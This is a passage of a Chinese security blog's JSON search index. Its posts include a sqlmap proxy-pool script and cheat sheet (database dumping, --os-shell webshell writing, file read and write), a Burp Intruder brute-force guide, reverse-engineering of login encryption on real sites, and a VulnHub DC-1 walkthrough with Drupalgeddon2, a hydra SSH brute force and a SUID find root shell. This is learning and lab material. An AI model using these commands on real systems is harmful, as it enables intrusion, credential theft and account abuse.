\" + str(e)) return \"[-]Sent to the proxy server : \" + str(e) while True: try: # 从代理服务器接收数据，然后转发回客户端 data_1 = mbsocket.recv(1024) if not data_1: break print('[*' + localtime + ']: Send data...') client.send(data_1) except socket.timeout as e: print(proxyip) print(\"[-]Back to the client : \" + str(e)) continue # 关闭连接 client.close() mbsocket.close()def Loadips(): print(\"[*]Loading proxy ips..\") ip_list = [] ip = ['ip', 'port'] with open(\"ips.txt\") as ips: lines = ips.readlines() for line in lines: ip[0], ip[1] = line.strip().split(\":\") ip[1] = eval(ip[1]) nip = tuple(ip) ip_list.append(nip) return ip_listdef main(): print('''*Atuhor : V@1n3R.*Blog :http://www.Lz1y.cn*date: 2017.7.17*http://www.Lz1y.cn/wordpress/?p=643 __ __ _ _____ ____ \\ \\ / /_ _/ |_ __ |___ /| _ \\ \\ \\ / / _` | | '_ \\ |_ \\| |_) | \\ V / (_| | | | | |___) | _ &lt; _ \\_/ \\__,_|_|_| |_|____/|_| \\_(_) ''') ip_list = Loadips() # ip_list = [('118.89.148.92',8088)] # ip_list = tuple(ip_list) try: pst = ProxyServerTest(ip_list) # 多线程 t = threading.Thread(target=pst.run, name='LoopThread') print('[*]Waiting for connection...') # 关闭多线程 t.start() t.join() except Exception as e: print(\"[-]main : \" + str(e)) return \"[-]main : \" + str(e)if __name__ == '__main__': main() SqlMap使用代理池 sqlmap加上代理 “–proxy=http://127.0.0.1:9999” 即可使用 使用之前建议先检测一下代理的有效性：http://h.jiguangdaili.com/check/","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"SqlMap总结","slug":"SqlMap总结","date":"2020-06-22T03:29:58.000Z","updated":"2020-06-22T05:41:42.962Z","comments":true,"path":"2020/06/22/SqlMap总结/","link":"","permalink":"http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/","excerpt":"","text":"SqlMap测试基本流程 sqlmap -u “url” sqlmap -u URL –dbs sqlmap -u URL -D database –tables sqlmap -u URL -D database -T tablename –columns sqlmap -u URL -D database -T tablename -C columnsname –dump SqlMap常用命令 1234567891011121314151617181920212223--is-dba 当前用户权限（是否为root权限，mssql下最高权限为sa）-–batch 默认选项运行--dbs 所有数据库--current-db 网站当前数据库--users 所有数据库用户--current-user 当前数据库用户--random-agent 构造随机user-agent–dbms 指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例--proxy http:&#x2F;&#x2F;local:8080 –threads 10 (可以自定义线程加速) 代理--time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒--threads&#x3D; 使用多少线程–fresh-queries fresh-queries会忽略之前的查询结果,进行重新请求操作–flush-session flush-session会清空当前URL相关的session–level 设置检测的方方面面和测试用例 - 默认是1,会尝试POST和GET - 2:Cookie也会加入检测 - 3:User-Agent和Referer也会检测, 更大的值会增加用例量-–technique 指定sqlmap使用的检测技术 B:Boolean-based-blind （布尔型注入） U:Union query-based （联合注入） E:Error-based （报错型注入) S:Starked queries （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入） T:Time-based blind （基于时间延迟注入） MYSQL新特性secure_file_priv对读写文件的影响 secure-file-priv是在Mysql5.7版本后引入的新特性，secure-file-priv参数是用来限制导入导出传到哪个指定目录 当配置文件内没有secure-file-priv参数，表示限制mysqld 不允许导入|导出 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 解决方法： windows下：修改my.ini 在[mysqld]内加入secure_file_priv = linux下：修改my.cnf 在[mysqld]内加入secure_file_priv = 之后需重启Mysql SqlMap技巧 抓包注入 从bp抓包文件中检测 1sqlmap.py -r &quot;路径&quot; 指定检测参数 -p 参数名 参数后面加上*d 伪静态注入 1.&#x2F;sqlmap.py -u “http:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot; 需要登陆的注入 利用cookie参数注入，也可以使用抓包注入： 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; 交互式shell 写文件的两个前提： 获取网站的绝对路径 拥有足够的权限dba/root 首先判断当前是否为dba权限 开始写入shell 1sqlmap.py -r &quot;路径&quot; --os-shell 选择shell脚本类型，接着输入路径，写入成功就进入一个交互式的shell命令行，还会返回一个上传文件的路径，也就是写入了2个shell，一个用来执行命令，另一个用来上传，其中上传shell的文件名为tmpugppx.php，出现admin admin这样的文字，这是sqlmap用来确认是否成功写进shell的标志 文件读写 读文件需要知道路径 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini 写文件 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt 表示将本地C:\\\\1.txt 写入到服务器端/opt/lampp/htdocs/vulnerabilities/exec/1.txt 辅助手工注入 两种方式，一种是每执行一次都会使用手工的语句注入一遍，效率比较低，第二种类似于平常命令行执行sql语句 12sqlmap.py -r &quot;路径&quot; --sql-query &quot;sql语句&quot;sqlmap.py -r &quot;路径&quot; --sql-shell SqlMap检测参数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465--current-user 检索当前用户--current-db 检索当前数据库-is-dba 当前用户权限（是否为root权限）-dbs 所有数据库--users 列出用户列表--passwords 列出用户密码的hash值--os-shell 提示为交互式操作系统shell--os-pwn 提示为OOB外壳，Meterpreter或VNC--batch 永远不要要求用户输入，使用默认行为--sql-shell 提示输入交互式sqlmap shell请求: 这些选项可用于指定如何连接到目标URL --data&#x3D;DATA 数据字符串通过POST发送 --cookie&#x3D;COOKIE HTTP Cookie的值 --random-agent 随机选择 HTTP User-Agent 头的值 --proxy&#x3D;PROXY 使用代理去连接目标URL --tor 使用匿名网络 --check-tor 检查Tor是否正确使用File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。 –file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径Optimization（优化）：这些选项可用于优化SqlMap的性能。 -o 开启所有优化开关 –predict-output 预测常见的查询输出 –keep-alive 使用持久的HTTP（S）连接 –null-connection 从没有实际的HTTP响应体中检索页面长度 –threads&#x3D;THREADS 最大的HTTP（S）请求并发量（默认为1）Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。 -p TESTPARAMETER 可测试的参数（S） –dbms&#x3D;DBMS 强制后端的DBMS为此值 –os&#x3D;OS 强制后端的DBMS操作系统为这个值 –prefix&#x3D;PREFIX 注入payload字符串前缀 –suffix&#x3D;SUFFIX 注入payload字符串后缀 –tamper&#x3D;TAMPER 使用给定的脚本（S）篡改注入数据Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。 –level&#x3D;LEVEL 执行测试的等级（1-5，默认为1） –risk&#x3D;RISK 执行测试的风险（0-3，默认为1） –string&#x3D;STRING 查询时有效时在页面匹配字符串 –regexp&#x3D;REGEXP 查询时有效时在页面匹配正则表达式 –text-only 仅基于在文本内容比较网页Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。 –technique&#x3D;TECH SQL注入技术测试（默认BEUST） –time-sec&#x3D;TIMESEC DBMS响应的延迟时间（默认为5秒） –union-cols&#x3D;UCOLS 定列范围用于测试UNION查询注入 –union-char&#x3D;UCHAR 用于暴力猜解列数的字符Fingerprint（指纹）： -f, –fingerprint 执行检查广泛的DBMS版本指纹Brute force（蛮力）：这些选项可以被用来运行蛮力检查。 –common-tables 检查存在共同表 –common-columns 检查存在共同列","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"BurpSuite——Intruder四种模式详解","slug":"BurpSuite——Intruder四种模式详解","date":"2020-06-17T14:57:52.000Z","updated":"2020-06-17T14:59:23.398Z","comments":true,"path":"2020/06/17/BurpSuite——Intruder四种模式详解/","link":"","permalink":"http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"一、Sniper（狙击手） Sniper模式只能使用一组 payload 集合，一次只使用一个 payload 位置；假如标记了两个位置 “A” 和 “B” ，payload 集合内有“1”和“2”两个值，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 不替换 2 2 不替换 3 不替换 1 4 不替换 2 适用场景：竞争条件测试（选择Null payloads），密码、验证码暴力破解，重放攻击等场景 二、Battering ram（攻城锤） 同样只能使用一组 payload 集合，不同的地方在于每次攻击都是替换所有payload标记位置；如果添加了两个参数的话，就一起进行爆破，两个参数爆破时候的值肯定就是一样的了： 攻击序列 位置A 位置B 1 1 1 2 2 2 适用场景：暴力破解 三、Pitchfork（草叉） 草叉模式允许使用多组payload组合，如果只添加了一个参数的话，会报错；在每个标记位置上遍历各自对应的payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 3 2 2 4 注：如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。 适用场景：恶意注册、撞裤 四、Cluster bomb（集束炸弹） 集束炸弹也允许使用多组payload组合，跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，那么它攻击会形成以下组合： 攻击序列 位置A 位置B 1 1 3 2 1 4 1 2 3 2 2 4 适用场景：账号、密码暴力破解","categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://yoursite.com/tags/BurpSuite/"}]},{"title":"JS逆向系列之谷歌翻译","slug":"JS逆向之谷歌翻译","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:25:36.955Z","comments":true,"path":"2020/06/17/JS逆向之谷歌翻译/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/","excerpt":"","text":"一、逆向谷歌翻译 分析过程 首次分析 首先找到谷歌翻译的Ajax请求接口 以get方式发送的Ajax请求，多次尝试，发现请求参数中，tk和q，是不断变化的，其中q是待翻译的内容，tk是根据q进行js加密算法生成的，所以我们要分析tk的产生。 通过断点逆向tk的加密算法 加密算法应该在translate_m_zh-CN.js文件里 打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数 依次往下点击每一个调用的函数，当到了QE函数的时候，发现了tk参数来自b，b又明显来自c 于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案 分析生成tk的JS代码 如下是我们刚获取的JS代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var mu = function(a) &#123; return function() &#123; return a &#125;&#125; , nu = function(a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = \"a\" &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = \"+\" == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = \"+\" == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125; , ou = null , pu = function(a) &#123; if (null !== ou) var b = ou; else &#123; b = mu(String.fromCharCode(84)); var c = mu(String.fromCharCode(75)); b = [b(), b()]; b[1] = c(); b = (ou = window[b.join(c())] || \"\") || \"\" &#125; var d = mu(String.fromCharCode(116)); c = mu(String.fromCharCode(107)); d = [d(), d()]; d[1] = c(); c = \"&amp;\" + d.join(\"\") + \"=\"; d = b.split(\".\"); b = Number(d[0]) || 0; for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, \"+-a^+6\"); a = nu(a, \"+-3^+b+-f\"); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return c + (a.toString() + \".\" + (a ^ b))&#125;; 发现做了很多不必要的操作、甚至多此一举，目的是用于混淆 如： 12345var mu &#x3D; function(a) &#123; return function() &#123; return a &#125;&#125; 还用了.fromCharCode()函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现tk生成需要另一样东西，就是tkk这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的 具体实现 说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可 Python脚本 1234567891011121314151617181920212223242526import requestsimport jsonimport execjsdef get_tk(q): with open('google_tk.js', 'r', encoding='utf-8') as f: js = f.read() j = execjs.compile(js) tk = j.call('pu', q) return tkdef translate_google(): q = input(\"请输入你要翻译的内容：\") headers = &#123; \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\", \"referer\": \"https://translate.google.cn/\" &#125; url = \"https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=\" + get_tk( q) + \"&amp;q=\" + q res = requests.get(url, headers=headers) data = res.content.decode() json_data = json.loads(data) print(json_data[0][0][0])if __name__ == \"__main__\": translate_google() tk.js 1234567891011121314151617181920212223242526272829303132//tkk = '441865.2154418832';var nu = function (a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = \"a\" &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = \"+\" == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = \"+\" == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125;,pu = function (a) &#123; tkk='441865.2154418832'; var d = tkk.split(\".\"); var b = Number(d[0]); for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, \"+-a^+6\"); a = nu(a, \"+-3^+b+-f\"); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return (a.toString() + \".\" + (a ^ b))&#125;; 运行效果 二、总结常见算法的加密原理 散列(hash)函数算法：MD5、SHA 对称加密算法：DES、3DES、AES 非对称性加密算法：RSA、DSA、ECC 散列(hash)函数算法 简介 Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。 1echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d 特点 一、不可逆，与原视数据没有对应关系 二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值 三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况 对称加密算法 简介 秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密) 非对称性加密算法 简介 秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高","categories":[{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"JS逆向系列一","slug":"JS逆向一","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:30:14.032Z","comments":true,"path":"2020/06/17/JS逆向一/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/","excerpt":"","text":"谷歌学术镜像 目标网址：https://ac.scmor.com/ 目的是爬取学术镜像的真实地址，在Elements视图下，观察现在访问a标签，发现启用了onclick事件，调用了visit()函数，函数内的内容，猜测就是加密后的真实URL地址。 全局搜索visit,在 https://ac.scmor.com/res/?f=run&amp;v=1590682984 中，找到了visit函数 经过观察，猜测strdecode是解密函数，就在上几行的位置，有个可疑参数autour[b]，猜测是URL地址，在Console中测试一下 经测试，autour是个数组，里面存放了加密后的真实地址，strdecode也的确是解密函数，现在去拉取strdecode函数具体内容 全局搜索，找到了strdecode，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来 到此，加密函数也有了，现在需要收集全部的URL，于是，之前的autour数组，也拉下来，现在只需要遍历一下就好了，刚好有个run函数就是For循环遍历autour数组，也拿下来 稍微修改下细节，就大功告成，效果图如下： DNS.COM 目标网址：https://www.dns.com/login.html 随便输入帐号密码进行测试，发现有个XHR请求，里面的password，email两个请求参数都做了加密，猜测这就是刚才输入的帐号密码 全局搜索 password,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了password:的位置，现在其实已经很明显是AES加密了，但还是测试一下吧 打断点，重新登陆，果然进入debugger状态了。 然后在console中测试下aes()函数以及它的参数到底是什么，经验证，发现aes()正是一个加密函数，加密后的内容和一开始看到的相吻合 现在查看aes函数具体的内容，发现了又有k和iv，并且有个CryptoJS对象 全局搜索CryptoJS，发现了crypto-js.js文件，明显这是CryptoJS加密库 并且发现还用了$(selector).action()的jQuery语法，所以还需要载入jQuery库 从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将aes函数也拉下来 效果图如下： 贝贝网 目标网址：https://m.beibei.com/login/login.html （需手机端） 输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的_abr_一直在变化，猜测它为加密参数 全局搜索_abr_无果，只能打请求断点，成功断住 但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在e.ajax中发现了包含有_abr_的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了_abr_= 记录_abr_的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1” 发现_abr_其实是由m(e.type, e.uri.pathname, e.query, e.form)函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求 单步跟踪，发现了关键函数MD5 继续单步跟踪，又发现了一个关键函数HMAC 网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数HmacSHA1，于是推测使用了SHA-1算法 经过长时间的单步跟踪，总算来到了一开始的函数返回值部分 现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用JSON.stringify()提取） 加密目标值：“01\\nPOST\\nb7da15fd7cdc2b8c73958ee82e7424aa\\n/mroute.html?method=beibei.user.token.get\\n1591002077” 密钥：“ytU7vwqIx2UXQNsi” Python测试效果如下 但是发现，与_abr的值相较，少了一些内容，回过头观察，发现_abr的值由a+m+h组成，a经测试是固定值01，m就是经过HMAC加密后的值，h会变动且暂时还不清楚 对h进行分析，发现是由s的值使用toString(16)函数变化而来，而s则是时间戳(new Date)变化而来 提取出h的算法，测试了一下，成功 接下来，只剩下需要加密的值，它如何产生的，观察发现由a + &quot;\\n&quot; + e + &quot;\\n&quot; + f + &quot;\\n&quot; + p + &quot;\\n&quot; + s组成，a、s都清楚了，e发现是POST，p是路径/mroute.html?method=beibei.h5.login，这两个也是固定值，只剩下f是MD5加密后的值，逆向f的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010 所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现 最终完成的效果","categories":[{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"VulnHub渗透之DC-1","slug":"VulnHub渗透之DC-1","date":"2020-05-25T04:57:51.000Z","updated":"2020-05-25T04:58:49.509Z","comments":true,"path":"2020/05/25/VulnHub渗透之DC-1/","link":"","permalink":"http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/","excerpt":"","text":"0×00 说明 kali与目标处于同一网段下 攻击机：Kali(VMware ) IP:192.168.1.31 特别说明：每个靶机作者都对靶机做了详细的描述以及攻击目标，比如DC1就需要找到5个flag，最终目标是在root的主目录中找到并读取该标志！ 通过每个flag所获得知识点 1、msf的熟练使用以及搜索可利用漏洞（Drupal）； 2、留意目标网站的配置文件（慢慢查看别错过重要信息）； 3、数据库管理员提权（更新管理员密码或者添加一个新用户）； 4、suid提权的命令（nmap、vim、find、bash、more、less、nano、cp）。 0×01 信息收集 探测目标IP namp -sP 192.168.1.0/24 arp-scan -l //扫描当前网段下的IP Cadmus Computer Systems 表示Virtualbox虚拟机 分析得出目标IP为192.168.1.30 靶机：DC-1(Virtualbox) IP:192.168.1.30 扫描端口 nmap -sV -p- 192.168.1.30 //扫描全端口 -sV 用来扫描目标主机和端口上运行的软件的版本 -p- 扫描0-65535全部端口 80端口开放，访问一下 Wappalyzer进行网站指纹识别，查看到是Drupal 7 查看一下robots.txt文件已经目录扫描(省略)。。发现没有可利用的地方 0×02metasploit 直接上metasploit 12root@sf:~# msfconsolemsf &gt; search Drupal 选择4，drupalgeddon2的exp，设置下rhost，直接exploit，成功 接下来使用msf自带的shell 发现flag1 查看当前路径下的文件，发现flag1.txt文件，查看一下，发现提示CMS配置文件有猫腻 发现flag2 网上搜索得知，Drupal 7的默认配置文件为sites/default/settings.php，查看发现flag2，还有数据库连接信息 0×003 弯路 尝试连接数据库，结果连接失败，应该是权限不足 爆破flag4用户密码 于是去查看/etc/passwd文件，发现flag4用户 使用hydra尝试爆破flag4用户的密码，hydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30 成功爆破flag4的密码，为 orange ，接下来ssh登录flag4用户，查看当前路径下有flag4.txt，得到新的提示——root目录里有个flag 0×04 连接数据库 然后我们连接数据库，这次成功 顺藤摸瓜，仔细查找数据库 查看user表，发现admin用户 查看role表 查看role_permission表 查看node表 发现flag3 发现flag3，得知uid为1的用户是不受Drupal权限管制的，具有最高权限，uid 1用户也就是admin， 0×05 两个思路 一、重置管理员密码 使用Drupal对数据库的加密方法，加密脚本位置在网站根目录下的script下(msf shell)，使用脚本生成加密密文，然后登陆数据库修改admin的密码 修改密码为123456 成功登陆 二、添加一个管理员权限的用户 先查看一下靶机的版本，7.24 msf搜索Druapl 7.24对应可利用的脚本，发现一个符合 运行脚本，进行利用 增加了一个用户user，密码为123456，尝试登陆网站，发现登陆成功 发现flag3 从网站上找到了flag3的界面，得到提示Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.，重点在（FIND the passwd、need to -exec that command、in the shadow） 根据线索，我们又找到了flag4以及它的目录，再根据flag4的提示，（用相同的方法在root目录下）找到最终flag 0×06 提权 于是，想到suid提权，查询具有root权限的命令，以下均可查询： find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb { } 注： -type f即文件，-perm -u=s 即user权限位为suid 发现find命令本身就是root权限 于是就用find提权，find ./ aaa -exec '/bin/sh' \\\\; ，或者新建一个文件，验证一下，已经是root了 最终flag 接着找到根目录下的root目录，里面就是最终的flag 0×07 总结 DC-1找到最终的flag并不难，难在找齐五个flag，第一次实验，很生疏，存在很多问题： metasploit 熟练度不足，且exploit模块成功后的shell不是交互性，DC-1安装了python环境，可以通过pty.spawn()获得交互性shell exploitdb熟练度也不足 Linux熟练度不足，find命令，有待学习 suid提权的命令（nmap、vim、find、bash、more、less、nano、cp），有待学习","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]}],"categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"},{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"},{"name":"JS逆向","slug":"JS逆向","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"python库","slug":"python库","permalink":"http://yoursite.com/tags/python%E5%BA%93/"},{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"},{"name":"技巧","slug":"技巧","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://yoursite.com/tags/BurpSuite/"},{"name":"JS逆向系列","slug":"JS逆向系列","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]}